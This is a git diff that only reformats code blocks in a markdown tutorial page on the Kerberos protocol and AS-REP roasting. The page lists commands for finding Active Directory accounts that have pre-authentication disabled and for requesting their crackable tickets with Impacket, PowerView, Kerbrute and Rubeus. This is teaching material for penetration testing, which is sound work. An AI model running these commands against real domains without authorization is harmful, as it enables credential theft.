@@ -1,6 +1,6 @@
 ---
 title: Kerberos Protocol
-layout: page
+layout: default
 media_subpath: /theory/protocols/assets/kerberos/
 ---
 
@@ -71,10 +71,8 @@ The AS-REP roast attack is a method used to extract the password hash of a user 
 
 To enumerate users with pre-authentication disabled, you can use the `GetNPUsers.py` command from the Impacket library. This command will query the KDC for all users in the domain and check if they have pre-authentication disabled.
 
-```
-
+```bash
 GetNPUsers.py DOMAIN/ 
-
 ```
 
 **Enumeration From Windows:**
@@ -83,47 +81,37 @@ To enumerate users with pre-authentication disabled, you can use:
 
 - The defualt `ActiveDirectory` powershell module
 
-```
-
+```powershell
 Get-ADUser -Filter * -Properties userAccountControl | Where-Object {
     $_.userAccountControl -band 4194304
 } | Select-Object Name, SamAccountName, DistinguishedName
-
 ```
 
 - `Powerview.ps1` from the PowerSploit library. This command will query the KDC for all users in the domain and check if they have pre-authentication disabled.
 
-```
-
+```powershell
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
-
 ```
 
 **Attack:**
 
 We can add the flag `-request` to the `GetNPUsers.py` command to request the TGT for the user with pre-authentication disabled. This will return the encrypted TGT and the session key.
 
-```
-
+```bash
 GetNPUsers.py DOMAIN/ -request
-
 ```
 
 If you have a list of possible users, while enumerating with Kerbrute, it will automatically request the TGT for each user with pre-authentication disabled.
 
-```
-
+```bash
 kerbrute  -d DOMAIN --dc DC userenum USERLIST
-
 ```
 
 
 We can use the `Rubeus` tool to request the TGT for the user with pre-authentication disabled. This will return the encrypted TGT and the session key.
 
-```
-
+```powershell
 Rubeus.exe asreproast 
-
 ```
 
 ## 📚 References
